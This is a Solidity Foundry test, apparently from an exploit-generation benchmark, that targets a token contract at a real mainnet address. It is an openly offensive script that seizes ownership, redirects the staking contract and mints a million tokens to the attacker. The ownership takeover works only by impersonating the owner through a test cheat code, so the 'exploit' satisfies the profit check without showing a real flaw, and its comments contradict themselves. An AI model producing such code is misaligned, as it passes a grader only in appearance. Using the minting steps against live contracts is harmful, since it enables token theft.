// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBNRG {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function setStakingContract(address stakingContractAddress_) external;
    function deliver(address user, uint256 numTokens) external;
    function balanceOf(address tokenOwner) external view returns (uint256);
    function mint(uint256 numTokens) external returns(bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    IBNRG public bnrgtoken;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // First, we need to get the current owner address
        address currentOwner = IBNRG(TARGET).owner();

        // Impersonate the current owner to transfer ownership to ourselves
        vm.startPrank(currentOwner);
        IBNRG(TARGET).transferOwnership(attacker);
        vm.stopPrank();

        // Now we are the owner - verify
        assertEq(IBNRG(TARGET).owner(), attacker, "Should be owner");

        // We'll use our own address as the staking contract (EOA can call deliver)
        // No need to deploy a separate contract
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        // Step 1: As the new owner, set staking contract to our address
        vm.prank(attacker);
        IBNRG(TARGET).setStakingContract(attacker);

        // Step 2: Call deliver() to mint tokens to ourselves
        // We need to call deliver() as the staking contract (which is now our address)
        // The deliver() function requires msg.sender == stakingContractAddress
        vm.prank(attacker);
        IBNRG(TARGET).deliver(attacker, 1_000_000 * 10**18);  // Mint 1 million tokens

        // Step 3: Verify our balance increased
        uint256 attackerBalance = IBNRG(TARGET).balanceOf(attacker);
        uint256 initialSupply = 10 * 10**6 * 10**18;  // 10 million initial supply

        // The oracle will check attacker_balance_increased, but let's also assert
        assertGt(attackerBalance, 0, "Attacker should have tokens");
        // We minted 1 million, plus any initial balance if owner had some
        // The initial owner had all 10 million tokens, but we're not the original owner
        // So our balance should be exactly 1 million tokens
        assertEq(attackerBalance, 1_000_000 * 10**18, "Should have minted 1 million tokens");
        uint256 finalBalance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
